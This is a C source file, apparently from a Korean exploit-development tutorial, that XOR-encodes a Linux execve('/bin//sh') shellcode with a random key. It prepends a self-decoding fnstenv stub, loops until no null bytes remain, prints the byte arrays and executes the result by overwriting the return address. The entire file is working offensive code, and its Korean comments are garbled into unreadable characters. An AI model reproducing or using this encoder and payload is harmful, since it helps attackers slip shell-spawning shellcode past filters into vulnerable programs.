#include <sys/time.h>
#include <stdlib.h>
#include <unistd.h>

int getnumber(int quo) {	// ���� ���� ���� �Լ�
  int seed;
  struct timeval tm;
  gettimeofday( &tm, NULL );
  seed = tm.tv_sec + tm.tv_usec;
  srandom( seed );
  return (random() % quo);
}

void execute(char *data){	// ���ڵ��� ���ڵ带 �����ϴ� �׽�Ʈ �Լ�
  printf("Executing...\n");
  int *ret;
  ret = (int *)&ret + 2;
  (*ret) = (int)data;
}
void print_code(char *data) {	// ���ڵ� ���
  int i,l = 15;
  for (i = 0; i < strlen(data); ++i) {
	if (l >= 15) {
	if (i)
	printf("\"\n");
	printf("\t\"");
	l = 0;
	}
	++l;
	printf("\\x%02x", ((unsigned char *)data)[i]);
	}
  printf("\";\n\n");
}

int main() {			// main �Լ�
	char shellcode[] =	// ���� ���ڵ�
		"\x31\xc0\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62"
		"\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

	int count;
	int number = getnumber(200);	// ���� ���� ������
	int badchar = 0;		// ���� ���� Ȯ�ο� ����� �÷���
	int ldecoder;			// ���ڴ��� ����
	int lshellcode = strlen(shellcode);  // ���ڵ��� ���� ����
	char *result;

	//simple fnstenv xor decoder, nulls are overwritten with length and key.
	// ������ fnstenv xor ���ڴ�, null�� ���̿� Ű�� ���
	char decoder[] = "\xd9\xe1\xd9\x74\x24\xf4\x5a\x80\xc2\x00\x31"
		"\xc9\xb1\x18\x80\x32\x00\x42\xe2\xfa";

	printf("Using the key: %d to xor encode the shellcode\n",number);
	decoder[9] += 0x14;		// ���ڴ��� ����
	decoder[16] += number;		// ���ڵ��� Ű
	ldecoder = strlen(decoder);	// ���ڴ� ���� ���

	printf("\nchar original_shellcode[] =\n");
	print_code(shellcode);

	do {				// ���ڵ� ���ڵ�
		if(badchar == 1) {		// ���� ���ڶ�� Ű �����
			number = getnumber(10);
			decoder[16] += number;
			badchar = 0;
		}
		for(count=0; count < lshellcode; count++) {	// ���ڵ� ��ü ����
			shellcode[count] = shellcode[count] ^ number; // xor ���ڵ� byte
			if(shellcode[count] == '\0') {  // �ٸ� ���� ���ڴ� ���⿡ ������
				badchar = 1;	// ���� ���� �÷��� ����, Ʈ���� �����
			}
		}
	} while(badchar == 1);		// ���� ���ڰ� �ִٸ� �ݺ�

	result = malloc(lshellcode + ldecoder);
	strcpy(result,decoder);		// ���� �տ� ���ڴ��� ��
	strcat(result,shellcode);	// ���ڴ� ������ ���ڵ��� ���ڵ带 ��
	printf("\nchar encoded[] =\n");	// ���̺� ���
	print_code(result);		// ���ڵ��� ���ڵ� ���
	execute(result);		// ���ڵ��� ���ڵ� ����
}
